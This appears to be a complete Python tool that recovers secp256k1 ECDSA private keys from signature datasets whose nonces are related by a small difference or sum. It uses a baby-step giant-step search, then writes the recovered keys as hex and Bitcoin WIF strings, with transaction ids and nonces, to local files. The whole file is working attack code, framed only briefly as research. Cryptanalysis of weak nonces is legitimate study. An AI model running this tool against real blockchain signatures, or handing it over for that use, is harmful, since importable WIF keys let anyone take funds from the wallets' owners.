#!/usr/bin/env python3
"""Bounded BSGS scan for ECDSA nonce point differences.

This is a local recovery research tool. It looks for same-pubkey signature pairs
where the nonce public points satisfy either:

    R2 - R1 = delta * G
    R1 + R2 = delta * G

for a small bounded delta. If found, it derives the candidate private key using
the corresponding linear ECDSA equations and accepts it only when the derived
public key matches the row pubkey. Recovered material is written only to local
artifacts; reports contain metadata only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
from collections import Counter, defaultdict
from pathlib import Path
from typing import Any

try:
    from coincurve import PrivateKey, PublicKey
except Exception as e:  # pragma: no cover - exercised in user environments
    raise SystemExit(f"coincurve is required. Install it in the active venv. import_error={e}")


N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def parse_int(value: Any) -> int:
    if isinstance(value, int):
        return value
    s = str(value or "").strip()
    if not s:
        raise ValueError("empty integer")
    if s.startswith(("0x", "0X")):
        return int(s, 16)
    if len(s) > 20 and all(c in "0123456789abcdefABCDEF" for c in s):
        return int(s, 16)
    return int(s, 10)


def normalize_hex(value: Any) -> str:
    s = str(value or "").strip().lower()
    if s.startswith("0x"):
        s = s[2:]
    return s


def normalize_pubkey(value: Any) -> str:
    s = normalize_hex(value)
    if len(s) == 66 and s[:2] in ("02", "03") and all(c in "0123456789abcdef" for c in s):
        return s
    if len(s) == 130 and s[:2] == "04" and all(c in "0123456789abcdef" for c in s):
        return s
    return ""


def inv(x: int) -> int:
    return pow(x % N, -1, N)


def scalar_bytes(x: int) -> bytes:
    x %= N
    if x == 0:
        raise ValueError("zero scalar")
    return x.to_bytes(32, "big")


def pub_from_priv(d: int) -> tuple[str, str]:
    pk = PrivateKey(scalar_bytes(d)).public_key
    return pk.format(compressed=True).hex(), pk.format(compressed=False).hex()


def point_key(p: PublicKey) -> bytes:
    return p.format(compressed=True)


def point_neg(p: PublicKey) -> PublicKey:
    b = bytearray(p.format(compressed=True))
    if b[0] == 2:
        b[0] = 3
    elif b[0] == 3:
        b[0] = 2
    else:
        raise ValueError("unexpected compressed key prefix")
    return PublicKey(bytes(b))


def point_add(points: list[PublicKey]) -> PublicKey | None:
    try:
        return PublicKey.combine_keys(points)
    except Exception:
        return None


def point_sub(a: PublicKey, b: PublicKey) -> PublicKey | None:
    return point_add([a, point_neg(b)])


def b58encode(data: bytes) -> str:
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = BASE58_ALPHABET[r] + out
    pad = 0
    for ch in data:
        if ch == 0:
            pad += 1
        else:
            break
    return "1" * pad + (out or "")


def b58check(payload: bytes) -> str:
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return b58encode(payload + chk)


def wif_from_priv(d: int, compressed: bool) -> str:
    payload = b"\x80" + d.to_bytes(32, "big")
    if compressed:
        payload += b"\x01"
    return b58check(payload)


def derive_r_point(row: dict[str, Any]) -> PublicKey | None:
    """Return R = s^-1(zG + rQ), or None if row data is unusable."""
    try:
        r = parse_int(row.get("r"))
        s = parse_int(row.get("_s_eff") if row.get("_s_eff") is not None else row.get("s"))
        z = parse_int(row.get("z") if row.get("z") is not None else row.get("m"))
        pub_hex = normalize_pubkey(row.get("pubkey_hex") or row.get("pubkey") or row.get("pub"))
        if not (1 <= r < N and 1 <= s < N and 0 <= z < N and pub_hex):
            return None
        q = PublicKey(bytes.fromhex(pub_hex))
        z_g = PrivateKey(scalar_bytes(z or N)).public_key if z else None
        r_q = q.multiply(scalar_bytes(r))
        combined = point_add([p for p in (z_g, r_q) if p is not None])
        if combined is None:
            return None
        return combined.multiply(scalar_bytes(inv(s)))
    except Exception:
        return None


def build_bsgs_table(bound: int) -> tuple[dict[bytes, int], int, PublicKey]:
    m = max(1, int(math.isqrt(bound) + 1))
    table: dict[bytes, int] = {}
    for j in range(m):
        if j == 0:
            continue
        p = PrivateKey(scalar_bytes(j)).public_key
        table.setdefault(point_key(p), j)
    m_g = PrivateKey(scalar_bytes(m)).public_key
    return table, m, m_g


def bsgs_solve_positive(target: PublicKey, bound: int, table: dict[bytes, int], m: int, m_g: PublicKey) -> int | None:
    if bound <= 0:
        return None
    cur = target
    neg_m_g = point_neg(m_g)
    for i in range(0, m + 1):
        hit = table.get(point_key(cur))
        if hit is not None:
            x = i * m + hit
            if 1 <= x <= bound:
                return x
        nxt = point_add([cur, neg_m_g])
        if nxt is None:
            # cur - mG is the point at infinity, so cur == mG and the
            # discrete log is exactly (i + 1) * m. There is no affine point for
            # infinity, so handle this baby-step j=0 case explicitly.
            x = (i + 1) * m
            if 1 <= x <= bound:
                return x
            return None
        cur = nxt
    return None


def bsgs_solve_signed(target: PublicKey, bound: int, table: dict[bytes, int], m: int, m_g: PublicKey) -> int | None:
    pos = bsgs_solve_positive(target, bound, table, m, m_g)
    if pos is not None:
        return pos
    neg = bsgs_solve_positive(point_neg(target), bound, table, m, m_g)
    if neg is not None:
        return -neg
    return None


def derive_delta_key(a: dict[str, Any], b: dict[str, Any], delta: int) -> int | None:
    """Derive d for relation k_b - k_a = delta."""
    try:
        r1 = parse_int(a["r"])
        s1 = parse_int(a.get("_s_eff") if a.get("_s_eff") is not None else a["s"])
        z1 = parse_int(a.get("z") if a.get("z") is not None else a.get("m"))
        r2 = parse_int(b["r"])
        s2 = parse_int(b.get("_s_eff") if b.get("_s_eff") is not None else b["s"])
        z2 = parse_int(b.get("z") if b.get("z") is not None else b.get("m"))
        denom = (s1 * r2 - s2 * r1) % N
        if denom == 0:
            return None
        d = ((s2 * z1 - s1 * z2 + delta * s1 * s2) * inv(denom)) % N
        return d if 1 <= d < N else None
    except Exception:
        return None


def derive_sum_key(a: dict[str, Any], b: dict[str, Any], delta_sum: int) -> int | None:
    """Derive d for relation k_a + k_b = delta_sum."""
    try:
        r1 = parse_int(a["r"])
        s1 = parse_int(a.get("_s_eff") if a.get("_s_eff") is not None else a["s"])
        z1 = parse_int(a.get("z") if a.get("z") is not None else a.get("m"))
        r2 = parse_int(b["r"])
        s2 = parse_int(b.get("_s_eff") if b.get("_s_eff") is not None else b["s"])
        z2 = parse_int(b.get("z") if b.get("z") is not None else b.get("m"))
        a1, b1 = (r1 * inv(s1)) % N, (z1 * inv(s1)) % N
        a2, b2 = (r2 * inv(s2)) % N, (z2 * inv(s2)) % N
        denom = (a1 + a2) % N
        if denom == 0:
            return None
        d = ((delta_sum - b1 - b2) * inv(denom)) % N
        return d if 1 <= d < N else None
    except Exception:
        return None


def candidate_matches_row(d: int, row: dict[str, Any]) -> bool:
    pub = normalize_pubkey(row.get("pubkey_hex") or row.get("pubkey") or row.get("pub"))
    if not pub:
        return False
    pc, pu = pub_from_priv(d)
    return pub in {pc, pu}


def recover_k_for_row(d: int, row: dict[str, Any]) -> int | None:
    try:
        r = parse_int(row["r"])
        s = parse_int(row.get("_s_eff") if row.get("_s_eff") is not None else row["s"])
        z = parse_int(row.get("z") if row.get("z") is not None else row.get("m"))
        k = ((z + r * d) * inv(s)) % N
        return k if 1 <= k < N else None
    except Exception:
        return None


def row_s_variants(row: dict[str, Any], mode: str) -> list[dict[str, Any]]:
    """Return internal row variants with effective s values.

    ECDSA signatures are invariant under (s, k) -> (-s, -k). Real datasets can
    carry original high-S, normalized low-S, or mixed encodings. Testing both
    effective signs mirrors the old rsz scanner's all_pvk_candidate behavior.
    """
    s = parse_int(row["s"])
    if mode == "original":
        vals = [s]
    elif mode == "negated":
        vals = [(-s) % N]
    else:
        vals = [s, (-s) % N]
    out: list[dict[str, Any]] = []
    seen: set[int] = set()
    for val in vals:
        if not (1 <= val < N) or val in seen:
            continue
        seen.add(val)
        obj = dict(row)
        obj["_s_eff"] = val
        obj["_s_variant"] = "original" if val == s else "negated"
        out.append(obj)
    return out


def load_rows(path: Path, max_rows: int) -> tuple[list[tuple[int, dict[str, Any]]], Counter[str]]:
    rows: list[tuple[int, dict[str, Any]]] = []
    counts: Counter[str] = Counter()
    with path.open("r", encoding="utf-8", errors="replace") as f:
        for idx, line in enumerate(f):
            raw = line.strip()
            if not raw:
                continue
            counts["rows_seen"] += 1
            if max_rows > 0 and len(rows) >= max_rows:
                counts["max_rows_reached"] += 1
                break
            try:
                obj = json.loads(raw)
            except Exception:
                counts["bad_json_rows"] += 1
                continue
            if not isinstance(obj, dict):
                counts["bad_json_rows"] += 1
                continue
            pub = normalize_pubkey(obj.get("pubkey_hex") or obj.get("pubkey") or obj.get("pub"))
            if not pub:
                counts["missing_pubkey"] += 1
                continue
            try:
                r, s = parse_int(obj.get("r")), parse_int(obj.get("s"))
                z = parse_int(obj.get("z") if obj.get("z") is not None else obj.get("m"))
            except Exception:
                counts["bad_rsz"] += 1
                continue
            if not (1 <= r < N and 1 <= s < N and 0 <= z < N):
                counts["bad_rsz"] += 1
                continue
            obj["_pub_norm"] = pub
            obj["_row_index"] = idx
            rows.append((idx, obj))
    counts["usable_rows"] = len(rows)
    return rows, counts


def append_key(out_json: Path, out_txt: Path, seen: set[tuple[str, str]], row: dict[str, Any], d: int, method: str, delta: int) -> bool:
    pc, pu = pub_from_priv(d)
    pub = normalize_pubkey(row.get("pubkey_hex") or row.get("pubkey") or row.get("pub")) or pc
    key = (pub, f"{d:064x}")
    if key in seen:
        return False
    seen.add(key)
    out_json.parent.mkdir(parents=True, exist_ok=True)
    rec = {
        "pubkey": pub,
        "pubkey_compressed": pc,
        "pubkey_uncompressed": pu,
        "priv_hex": f"{d:064x}",
        "wif": wif_from_priv(d, compressed=True),
        "wif_compressed": wif_from_priv(d, compressed=True),
        "wif_uncompressed": wif_from_priv(d, compressed=False),
        "method": method,
        "delta_signed": int(delta),
        "txid": row.get("txid"),
        "vin": row.get("vin", row.get("input_index")),
        "r": f"{parse_int(row['r']):064x}",
    }
    with out_json.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, separators=(",", ":")) + "\n")
    with out_txt.open("a", encoding="utf-8") as f:
        f.write(f"{rec['priv_hex']} {rec['wif_compressed']} {rec['wif_uncompressed']} ({method})\n")
    return True


def append_k(out_k: Path, r: int, ks: list[int]) -> None:
    vals = sorted({k % N for k in ks if 1 <= (k % N) < N})
    if not vals:
        return
    out_k.parent.mkdir(parents=True, exist_ok=True)
    with out_k.open("a", encoding="utf-8") as f:
        f.write(json.dumps({
            "r": f"{r:064x}",
            "k_candidates": [f"{k:064x}" for k in vals],
            "source": "rdiff-bsgs",
        }, separators=(",", ":")) + "\n")


def main() -> None:
    ap = argparse.ArgumentParser(description="Bounded BSGS R-difference recovery scan")
    ap.add_argument("--sigs", required=True, help="Input signatures JSONL")
    ap.add_argument("--out-json", default="recovered_keys.jsonl")
    ap.add_argument("--out-txt", default="recovered_keys.txt")
    ap.add_argument("--out-k", default="recovered_k.jsonl")
    ap.add_argument("--report", default="rdiff_bsgs_report.json")
    ap.add_argument("--bound", type=int, default=65536, help="Maximum absolute delta to solve")
    ap.add_argument("--max-rows", type=int, default=0)
    ap.add_argument("--max-pairs-per-pubkey", type=int, default=200000)
    ap.add_argument("--max-total-pairs", type=int, default=0, help="Global pair cap across all pubkeys (0 = unlimited)")
    ap.add_argument("--min-sigs-per-pubkey", type=int, default=2)
    ap.add_argument("--max-pubkeys", type=int, default=0)
    ap.add_argument("--mode", choices=("diff", "sum", "both"), default="both",
                    help="Scan R2-R1, R1+R2, or both relations")
    ap.add_argument("--s-variants", choices=("original", "negated", "both"), default="both",
                    help="Effective s values to test. both mirrors legacy rsz scanners and handles low-S/high-S/reflected-k encodings")
    ap.add_argument("--progress-every", type=int, default=0,
                    help="Print progress every N tested pairs (0 = quiet)")
    args = ap.parse_args()

    rows, parse_counts = load_rows(Path(args.sigs), max(0, args.max_rows))
    by_pub: dict[str, list[dict[str, Any]]] = defaultdict(list)
    for _, obj in rows:
        by_pub[obj["_pub_norm"]].append(obj)

    pub_items = [(pub, rs) for pub, rs in by_pub.items() if len(rs) >= max(2, args.min_sigs_per_pubkey)]
    pub_items.sort(key=lambda x: len(x[1]), reverse=True)
    if args.max_pubkeys > 0:
        pub_items = pub_items[: args.max_pubkeys]

    table, m, m_g = build_bsgs_table(max(1, args.bound))
    seen_keys: set[tuple[str, str]] = set()
    stats: Counter[str] = Counter(parse_counts)
    stats["pubkeys_considered"] = len(pub_items)
    stats["bsgs_bound"] = int(args.bound)
    stats["bsgs_table_size"] = len(table)
    stats["s_variants_mode"] = args.s_variants

    for pub, group in pub_items:
        rpoints: list[tuple[dict[str, Any], PublicKey]] = []
        for row in group:
            for variant in row_s_variants(row, args.s_variants):
                stats["r_point_variant_attempts"] += 1
                rp = derive_r_point(variant)
                if rp is None:
                    stats["r_point_derive_failed"] += 1
                    continue
                rpoints.append((variant, rp))
                stats["r_point_variants_usable"] += 1
        if len(rpoints) < 2:
            continue

        pair_count = 0
        for i in range(len(rpoints)):
            for j in range(i + 1, len(rpoints)):
                if args.max_total_pairs > 0 and stats["pairs_tested"] >= args.max_total_pairs:
                    stats["global_pair_cap_hit"] += 1
                    break
                if pair_count >= max(0, args.max_pairs_per_pubkey):
                    stats["pair_cap_hit"] += 1
                    break
                row1, rp1 = rpoints[i]
                row2, rp2 = rpoints[j]
                if row1.get("_row_index") == row2.get("_row_index"):
                    stats["same_row_variant_pairs_skipped"] += 1
                    continue
                pair_count += 1
                stats["pairs_tested"] += 1
                if args.progress_every > 0 and stats["pairs_tested"] % args.progress_every == 0:
                    print(
                        "rdiff-bsgs progress:",
                        f"pairs_tested={stats['pairs_tested']}",
                        f"pubkey_prefix={pub[:16]}",
                        f"diff_delta_found={stats.get('diff_delta_found', 0)}",
                        f"sum_delta_found={stats.get('sum_delta_found', 0)}",
                        f"keys_validated={stats.get('keys_validated', 0)}",
                        flush=True,
                    )
                if args.mode in ("diff", "both"):
                    diff = point_sub(rp2, rp1)
                else:
                    diff = None
                if diff is not None:
                    delta = bsgs_solve_signed(diff, args.bound, table, m, m_g)
                    if delta is not None:
                        stats["diff_delta_found"] += 1
                        d = derive_delta_key(row1, row2, delta)
                        if d is not None and candidate_matches_row(d, row1) and candidate_matches_row(d, row2):
                            stats["keys_validated"] += int(append_key(Path(args.out_json), Path(args.out_txt), seen_keys, row1, d, "rdiff-bsgs-diff", delta))
                            k1 = recover_k_for_row(d, row1)
                            k2 = recover_k_for_row(d, row2)
                            if k1 and k2:
                                append_k(Path(args.out_k), parse_int(row1["r"]), [k1, (-k1) % N])
                                append_k(Path(args.out_k), parse_int(row2["r"]), [k2, (-k2) % N])
                        else:
                            stats["diff_delta_rejected"] += 1

                if args.mode in ("sum", "both"):
                    sm = point_add([rp1, rp2])
                else:
                    sm = None
                if sm is not None:
                    delta = bsgs_solve_signed(sm, args.bound, table, m, m_g)
                    if delta is not None:
                        stats["sum_delta_found"] += 1
                        d = derive_sum_key(row1, row2, delta)
                        if d is not None and candidate_matches_row(d, row1) and candidate_matches_row(d, row2):
                            stats["keys_validated"] += int(append_key(Path(args.out_json), Path(args.out_txt), seen_keys, row1, d, "rdiff-bsgs-sum", delta))
                            k1 = recover_k_for_row(d, row1)
                            k2 = recover_k_for_row(d, row2)
                            if k1 and k2:
                                append_k(Path(args.out_k), parse_int(row1["r"]), [k1, (-k1) % N])
                                append_k(Path(args.out_k), parse_int(row2["r"]), [k2, (-k2) % N])
                        else:
                            stats["sum_delta_rejected"] += 1
            if args.max_total_pairs > 0 and stats["pairs_tested"] >= args.max_total_pairs:
                break
            if pair_count >= max(0, args.max_pairs_per_pubkey):
                break
        if args.max_total_pairs > 0 and stats["pairs_tested"] >= args.max_total_pairs:
            break

    report = {
        "input": str(args.sigs),
        "out_json": str(args.out_json),
        "out_k": str(args.out_k),
        "bound": int(args.bound),
        "max_pairs_per_pubkey": int(args.max_pairs_per_pubkey),
        "stats": dict(stats),
        "priv_material": "LOCAL_ARTIFACT_ONLY",
    }
    Path(args.report).parent.mkdir(parents=True, exist_ok=True)
    Path(args.report).write_text(json.dumps(report, indent=2), encoding="utf-8")
    print(
        "rdiff-bsgs complete:",
        f"pairs_tested={stats.get('pairs_tested', 0)}",
        f"diff_delta_found={stats.get('diff_delta_found', 0)}",
        f"sum_delta_found={stats.get('sum_delta_found', 0)}",
        f"keys_validated={stats.get('keys_validated', 0)}",
        f"report={args.report}",
    )


if __name__ == "__main__":
    main()
